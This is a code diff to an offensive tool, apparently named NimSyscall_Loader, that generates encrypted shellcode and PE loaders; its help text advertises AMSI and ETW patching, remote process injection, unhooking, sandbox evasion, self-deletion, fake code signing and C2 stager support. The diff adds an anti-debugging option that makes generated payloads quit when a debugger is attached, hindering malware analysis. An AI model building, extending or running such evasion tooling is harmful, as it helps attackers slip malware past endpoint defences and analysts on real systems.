@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -108,6 +108,7 @@ Options:
   --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
   --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
+  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -197,6 +198,7 @@ var
     fluctuate: bool = false
     noDInvoke: bool = false
     noRES: bool = false
+    antidebug: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
@@ -366,6 +368,9 @@ if args["--obfuscatefunctions"]:
 
 if args["--debug"]:
   debugMode = true
+
+if args["--antidebug"]:
+  antidebug = true
 
 if args["--x86"]:
   compileX86 = true
@@ -920,6 +925,12 @@ var remoteProcID = DWORD(tProcess.processID)
 
 """
 
+let BeingDebugged * = fmt"""
+import AntiDebug
+if(AmIDebugged()):
+  quit()
+"""
+
 var stub = Cryptstub1
 if (not noDInvoke):
     stub.add(DInvokeBaseStub)
@@ -934,6 +945,9 @@ if(pump):
         if (m == "reputation"):
             echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
+
+if(antidebug):
+    stub.add(BeingDebugged)
 
 if(sandbox):
     if (not noDInvoke): stub.add(DInvokeSandBoxStub)
